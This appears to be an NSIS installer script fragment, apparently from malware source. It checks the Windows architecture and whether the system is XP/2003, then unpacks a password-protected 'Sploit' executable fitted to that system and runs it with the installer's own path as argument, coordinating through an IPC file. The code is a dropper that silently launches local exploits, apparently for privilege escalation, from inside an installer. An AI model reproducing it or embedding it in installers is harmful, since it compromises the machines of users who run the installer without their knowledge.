!include WinVer.nsh

Function Test64
; Install to the correct directory on 32 bit or 64 bit machines
	IfFileExists $WINDIR\SYSWOW64\*.* Is64bit Is32bit
	Is32bit:
		StrCpy $0 0

		GOTO End32Bitvs64BitCheck
	Is64bit:
		StrCpy $0 1

	End32Bitvs64BitCheck:
FunctionEnd

;----------------------------------------------------------------------------------
Function IsXp2003
  StrCpy $0 0
    ${If} ${IsWin2003}
    ${OrIf} ${IsWinXP}
      ${DbgBox} "XP/2003"
      StrCpy $0 1
    ${EndIf}
FunctionEnd

;----------------------------------------------------------------------------------
!define DoSploit "!insertmacro _DoSploit"
!macro _DoSploit _Sploit_ 
  ${UnZipFileName} ${MAIN_ZIP} "${_Sploit_}${EXE_TMP}" "${ZIP_PWD}"
  ExecCmd::exec '"$UnZipDir\${_Sploit_}${EXE_TMP} $\"$EXEDIR\$EXEFILE$\""' 
!macroend

Function Install_Sploit
  Push $0
  Push $1
  Push $2
    Push $OUTDIR
      ${XOutPath} "$UnZipDir"

      ${WriteToFile} ${IPC_TXT} "***"

      Call Test64
      ${If} $0 == 1 ; x64 system		
         Call IsXp2003
         ${If} $0 == 1
           ${DoSploit} "${SPLOIT_XP_64}"
         ${Else}
           ${DoSploit} "${SPLOIT_64}"
         ${EndIf}
      ${Else}       ; x32 system
         Call IsXp2003
         ${If} $0 == 1
           ${DoSploit} "${SPLOIT_XP_32}"
         ${Else}
           ${DoSploit} "${SPLOIT_32}"
         ${EndIf}
      ${EndIf}       
    Pop $OUTDIR
      SetOutPath $OUTDIR 

    Call WaitIPC  
  Pop $2
  Pop $1
  Pop $0
FunctionEnd
